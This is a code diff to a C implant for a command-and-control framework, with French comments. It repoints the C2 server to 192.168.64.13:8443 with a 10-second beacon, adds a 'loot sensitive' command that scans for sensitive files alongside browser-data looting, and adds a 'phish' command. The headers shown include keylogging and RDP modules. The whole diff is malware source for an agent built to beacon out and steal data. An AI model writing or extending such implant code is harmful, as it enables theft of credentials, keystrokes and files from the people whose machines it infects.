@@ -9,9 +9,10 @@
 #include "rdp.h"
 #include "keylog.h"
 #include "loot.h"
+#include "phish.h"
 
 // Configuration
-#define C2_SERVER "c2.s0p0wned.local"
+#define C2_SERVER "192.168.64.13"
 #define C2_PORT 8443
 #define BEACON_INTERVAL 10  // Secondes entre chaque beacon
 
@@ -345,11 +346,23 @@ void execute_command(const char *cmd, char *output, size_t output_size) {
             printf("[*] Searching for browser data...\n");
             loot_browser(output, output_size);
         }
+        else if (strcmp(loot_arg, "sensitive") == 0) {
+            printf("[*] Scanning for sensitive files...\n");
+            loot_sensitive(output, output_size);
+        }
         else {
             snprintf(output, output_size,
                     "[-] Unknown loot command\n"
-                    "[*] Available: loot sysinfo | find <pattern> | grab <file> | browser");
+                    "[*] Available: loot sysinfo | find <pattern> | grab <file> | browser | sensitive");
         }
+        return;
+    }
+
+    // Commande Phish
+    if (strncmp(cmd, "phish", 5) == 0) {
+        const char* args = cmd + 5;
+        while (*args == ' ') args++;
+        cmd_phish((char*)args, output, output_size);
         return;
     }
 
